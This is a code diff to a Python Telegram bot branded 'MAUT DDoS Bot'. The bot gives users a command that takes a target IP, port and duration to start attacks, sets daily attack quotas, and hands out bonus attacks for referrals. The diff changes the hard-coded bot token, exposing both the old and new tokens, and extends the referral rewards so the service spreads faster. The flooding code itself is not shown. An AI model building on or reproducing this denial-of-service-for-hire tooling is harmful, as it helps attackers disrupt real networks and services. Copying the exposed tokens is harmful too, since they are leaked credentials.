@@ -9,11 +9,11 @@ from threading import Lock
 import sqlite3
 
 # Bot configuration
-bot = telebot.TeleBot('7724010740:AAHl1Avs1FDKlfvTjABS3ffe6-nVhkcGCj0')
+bot = telebot.TeleBot('7970310406:AAGh47IMJxhCPwqTDe_3z3PCvXugf7Y3yYE')
 admin_id = {"8167507955"}
 DB_FILE = "maut_bot.db"
 LOG_FILE = "attack_logs.txt"
-COOLDOWN_TIME = 1  # 5 minutes
+COOLDOWN_TIME = 600  # 5 minutes
 MAX_ATTACK_TIME = 240  # 4 minutes
 MAX_DAILY_ATTACKS = 10  # 10 attacks per day
 ATTACKS_PER_INVITE = 2  # 2 bonus attacks per invite
@@ -170,13 +170,35 @@ def get_cooldown_remaining(user_id):
 
 def add_referral(referrer_id, referred_id):
     try:
+        # Check if this is a valid new referral
+        if referrer_id == referred_id:
+            return False
+            
+        # Check if this referral already exists
+        existing = db_execute("SELECT 1 FROM referrals WHERE referrer_id=? AND referred_id=?", 
+                            (referrer_id, referred_id), fetch=True)
+        if existing:
+            return False
+            
+        # Create both users if they don't exist
+        create_user(referrer_id)
+        create_user(referred_id)
+        
+        # Add the referral record
         db_execute("INSERT INTO referrals (referrer_id, referred_id) VALUES (?, ?)", 
-                   (referrer_id, referred_id))
-        db_execute("UPDATE users SET invites = invites + 1 WHERE user_id=?", (referrer_id,))
-        db_execute("UPDATE users SET attacks_today = attacks_today + ? WHERE user_id=?", 
+                  (referrer_id, referred_id))
+        
+        # Give bonus to referrer
+        db_execute("UPDATE users SET invites = invites + 1, attacks_today = attacks_today + ? WHERE user_id=?", 
                   (ATTACKS_PER_INVITE, referrer_id))
+        
+        # Give bonus to referred user
+        db_execute("UPDATE users SET attacks_today = attacks_today + ? WHERE user_id=?", 
+                  (ATTACKS_PER_INVITE, referred_id))
+        
         return True
-    except:
+    except Exception as e:
+        print(f"Referral error: {e}")
         return False
 
 def get_user_stats(user_id):
@@ -198,15 +220,15 @@ def get_user_stats(user_id):
 
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    # Check if this is a referral
+    user_id = str(message.chat.id)
+    create_user(user_id)  # Ensure user exists
+    
+    # Check for referral
     referral_success = False
     if len(message.text.split()) > 1:
         referrer_id = message.text.split()[1]
-        if referrer_id.isdigit() and referrer_id != str(message.chat.id):
-            referral_success = add_referral(referrer_id, str(message.chat.id))
-    
-    # Create user if not exists
-    create_user(str(message.chat.id))
+        if referrer_id.isdigit() and referrer_id != user_id:
+            referral_success = add_referral(referrer_id, user_id)
     
     caption = """
 🚀 *Welcome to MAUT DDoS Bot* 🚀
@@ -214,6 +236,7 @@ def start_command(message):
 *Public Access Features:*
 - 10 free attacks per day
 - +2 attacks for each friend you invite
+- +2 attacks when you join via invite link
 
 *Available Commands:*
 /maut <ip> <port> <time> - Start attack
@@ -228,7 +251,7 @@ def start_command(message):
 """
     
     if referral_success:
-        caption += "\n🎉 You received +2 attacks for joining via referral!"
+        caption += "\n🎉 You received +2 bonus attacks for joining via invite link!"
     
     try:
         bot.send_photo(
@@ -406,7 +429,7 @@ def show_stats(message):
     response = f"""
 📊 *Your Stats* 📊
 
-• Attacks today: {stats['attacks_today']}/{MAX_DAILY_ATTACKS}
+• Attacks today: {stats['attacks_today']}/{MAX_DAILY_ATTACKS + stats['bonus_attacks']}
 • Attacks remaining: {stats['attacks_remaining']}
 • Total attacks: {stats['total_attacks']}
 • Friends invited: {stats['invites']}
@@ -424,6 +447,8 @@ def invite_command(message):
     bot_name = bot.get_me().username
     invite_link = f"https://t.me/{bot_name}?start={user_id}"
     
+    stats = get_user_stats(user_id)
+    
     response = f"""
 📨 *Invite Friends & Earn Attacks* 📨
 
@@ -434,7 +459,7 @@ def invite_command(message):
 • You get +{ATTACKS_PER_INVITE} attacks
 • They get +{ATTACKS_PER_INVITE} attacks
 
-📊 You've invited {get_user_stats(user_id)['invites']} friends so far!
+📊 You've invited {stats['invites']} friends and earned {stats['bonus_attacks']} bonus attacks!
 """
     bot.reply_to(message, response, parse_mode="Markdown")
 
@@ -499,6 +524,7 @@ def admin_stats(message):
     today_attacks = db_execute("SELECT SUM(attacks_today) FROM users WHERE last_attack_date=?", 
                               (datetime.date.today().isoformat(),), fetch=True)[0][0] or 0
     total_attacks = db_execute("SELECT SUM(total_attacks) FROM users", fetch=True)[0][0] or 0
+    total_referrals = db_execute("SELECT COUNT(*) FROM referrals", fetch=True)[0][0]
     
     response = f"""
 👑 *Admin Stats* 👑
@@ -506,6 +532,7 @@ def admin_stats(message):
 • Total users: {total_users}
 • Attacks today: {today_attacks}
 • Total attacks: {total_attacks}
+• Total referrals: {total_referrals}
 • Active attacks: {"Yes" if is_attack_active() else "No"}
 """
     bot.reply_to(message, response, parse_mode="Markdown")
